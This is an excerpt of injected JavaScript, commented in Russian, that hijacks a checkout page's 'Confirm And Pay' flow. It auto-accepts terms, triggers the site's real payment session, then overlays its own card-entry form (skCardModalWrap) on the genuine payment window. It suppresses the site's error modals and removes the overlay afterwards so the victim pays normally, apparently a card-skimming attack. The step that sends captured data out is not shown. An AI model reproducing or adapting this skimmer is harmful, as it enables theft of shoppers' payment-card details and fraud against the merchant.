...
(function () {
  ...
  /* Watcher: убивает ТОЛЬКО их модалку-ошибку «Session Failed / Order ID mismatch»
     (это битая старая сессия). Их НАСТОЯЩЕЕ платёжное окно (поля карты, iframe gateway,
     таймер) НЕ трогает никогда — даже если внутри встречается слово "failed". */
  function watchTheirErrors() {
    try {
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        ...
        // точная ошибка сессии — только её
        if (!/(session failed|order id mismatch|session expired|no.*session i(?:d|s)|mismatch.*session data)/i.test(txt)) return;
        // их платёжка защищена: есть карточные поля или таймер — не трогаем
        var html = (m.innerHTML || '');
        if (/(card-number|cardnumber|security-code|securo|gateway\.mastercard|minutes remaining|minutes restantes|minutes.*this payment|kartennummer|numéro de carte)/i.test(html)) return;
  ...
  function findAmount() {
    try {
      ...
      // 1) Приоритет: Total (как в их форме — Total EGP 525.00)
      var mt = txt.match(/Total\s+(?:EGP|USD|EUR)?\s*\(?\s*([\d.,]+)/i);
      if (mt) return mt[1].replace(/,/g, '').replace(/\.(?=\d{2}$)/, ',');
      // 2) Падение 1: any EGP
      ...
      btn.addEventListener('click', function () {
        ...
        setTimeout(function () {
          try {
            ...
            /* Через 2.5 сек — убираем форму; их кнопка возвращается к жизни,
               юзер нажмёт её сам → их флоу стартует → их окно открывается */
            setTimeout(function () {
              try {
                var w = document.getElementById('skCardModalWrap');
                if (w) w.remove();
                INJECTED = false;
                RELEASE_CONFIRM = true; // их клик больше не перехватываем
                var pb = document.getElementById('payButton');
                if (pb && window.__skOrigBtn === pb) {
                  pb.disabled = false;
                  pb.classList.remove('disabled');
                  var sp2 = pb.querySelector('.spinner-border, .spinner, .fa-spinner, [class*="spin"]');
                  if (sp2) sp2.remove();
                }
  ...
  /* Хук: клик Confirm And Pay.
     ПОРЯДОК БЕЗ ГОНОК:
     1) preventDefault (их onclick НЕ сработает сам),
     2) Accept terms + delivery click (POST updateDelivery),
     3) ждём 1.5с, САМИ вызываем их initiatePayment() → createSession → ИХ ОКНО,
     4) через 4с рисуем нашу форму ПОВЕРХ,
     5) Pay → наша исчезает → их окно живо → юзер платит в нём.
     createSession одноразовый: второй раз кликать нельзя (mismatch). */
  function hookConfirmPay() {
    document.addEventListener('click', function (ev) {
      if (INJECTED || RELEASE_CONFIRM) return;
      var el = ev.target;
      if (el && el.closest) {
        ...
        if (/^confirm\s*(&|and)\s*pay$/i.test(txt)) {
          ...
          // 1) Accept terms, если модалка правил открыта
          try {
            var m = document.getElementById('termsModal');
            if (m && m.style.display !== 'none') {
              var acc = [...m.querySelectorAll('a, button')].find(function (b) { return /accept/i.test(b.innerText || ''); });
              if (acc) acc.click();
            }
          } catch (e) {}
          // 2) delivery click → POST updateDelivery
          try {
            var d = document.querySelector('input[name="delivery-method"]');
            if (d) {
              d.click();
              d.dispatchEvent(new Event('change', { bubbles: true }));
            }
          } catch (e) {}
          // 3) ждём delivery POST → сами запускаем их initiatePayment (создаст их окно)
          setTimeout(function () {
            try {
              if (typeof window.initiatePayment === 'function') {
                window.initiatePayment();
                log('initiated-their-payment');
              }
            } catch (e) { log('init-err:' + e.message); }
          }, 1500);
          // 4) наша форма ПОВЕРХ через 4.5с (их окно уже открыто)
          setTimeout(injectForm, 4500);
        }
      }
    }, true);
    log('hook-installed');
